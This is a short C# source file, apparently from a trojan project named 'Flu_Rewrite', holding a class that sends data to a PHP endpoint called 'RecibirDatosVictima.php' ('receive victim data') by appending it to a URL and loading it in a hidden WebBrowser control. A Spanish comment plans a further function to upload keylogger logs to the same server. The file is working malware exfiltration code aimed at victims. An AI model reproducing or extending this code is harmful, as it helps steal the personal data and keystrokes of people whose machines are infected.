using System;
using System.Windows.Forms;

namespace Flu_Rewrite
{
    class RetornoDatos
    {
        //Deberia haber una funcion que subiese los logs del keylogger al servidor
        private const string php = "http://192.168.1.33/RecibirDatosVictima.php?respuesta=";

        private static WebBrowser WB = new WebBrowser();

        public static void RetornarInformacion(String info)
        {
            WB.Navigate("http://192.168.1.33/RecibirDatosVictima.php?respuesta=" + info);
            while (WB.ReadyState != WebBrowserReadyState.Complete)
            {
                Application.DoEvents();
            }
        }
    }
}
